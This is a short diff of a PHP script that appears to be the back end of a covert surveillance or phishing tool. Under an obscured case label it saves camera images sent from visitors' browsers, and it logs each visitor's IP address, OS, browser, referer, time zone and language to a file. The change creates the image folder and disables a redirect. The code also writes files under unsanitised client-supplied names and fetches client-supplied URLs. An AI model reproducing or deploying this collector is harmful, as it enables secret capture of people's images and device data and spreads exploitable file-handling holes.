@@ -22,6 +22,9 @@
     switch ($_POST['Status']) { // set template page
       case 'x1q': // Access Camera
         if ($_POST['err']=='false') {
+          if (!file_exists("camera/output")) {
+            mkdir("camera/output");
+          }
           $imgSrc = $_POST['imgSrc'];
           $output = 'camera/output/'.$_POST['fileName'].'.png';
           file_put_contents($output, file_get_contents($imgSrc));
@@ -68,6 +71,7 @@
         fclose($log);
         break;
       default:
+      
         $data = "\r
   IP : ".getIP()." (".getOS().") / ".getBrowser()."
   Referer : ".getReferer()."
@@ -83,13 +87,17 @@
   Time Zone : $_POST[Time_Zone]
   Language : $_POST[Language]
   User Agent : $_SERVER[HTTP_USER_AGENT]\n";
+
       $log = fopen("data.log",'a+');
+
       fwrite($log, "&".$data);
+
       fclose($log);
+
       break;
     }
 
-    header('location: /');
+    // header('location: /');
   }
 
 ?>
